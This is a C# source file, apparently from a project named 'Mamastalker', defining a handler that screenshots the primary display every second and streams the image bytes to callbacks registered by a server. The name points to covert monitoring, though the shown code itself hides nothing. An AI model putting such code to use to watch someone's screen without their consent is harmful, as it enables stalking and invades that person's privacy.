using Mamastalker.Common.Logic.DataConverters.Abstract;
using Mamastalker.Server.Logic.ResponseHandlers.Abstract;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Mamastalker.Common.FormsPresentation.ResponseHandlers
{
    public class ScreenshotOnTimerResponseHandler<TData> : IResponseHandler<TData>
    {
        private readonly IDataConverter<Bitmap, byte[]> _bitmapToByteArrayConverter;

        private Action<byte[]> _listeningCallback;

        public bool Running { get; set; }

        public ScreenshotOnTimerResponseHandler(IDataConverter<Bitmap, byte[]> bitmapToByteArrayConverter)
        {
            _bitmapToByteArrayConverter = bitmapToByteArrayConverter;
        }

        private async Task UpdateLoop()
        {
            while (Running)
            {
                await Task.Delay(1000);

                SendScreenshot();
            }
        }

        private void SendScreenshot()
        {
            var screen = Screen.PrimaryScreen;

            var bitmap = new Bitmap(screen.Bounds.Width,
                                    screen.Bounds.Height,
                                    PixelFormat.Format32bppArgb);

            var graphics = Graphics.FromImage(bitmap);

            graphics.CopyFromScreen(screen.Bounds.X,
                                    screen.Bounds.Y,
                                    0,
                                    0,
                                    screen.Bounds.Size,
                                    CopyPixelOperation.SourceCopy);

            var byteData = _bitmapToByteArrayConverter.Parse(bitmap);

            _listeningCallback?.Invoke(byteData);
        }

        public async Task StartUpdateLoop()
        {
            if (Running)
            {
                return;
            }

            Running = true;

            await UpdateLoop();
        }

        public void HandleData(TData data, Action<byte[]> reply)
        {
            _listeningCallback += (byteData) => reply?.Invoke(byteData);
        }
    }
}
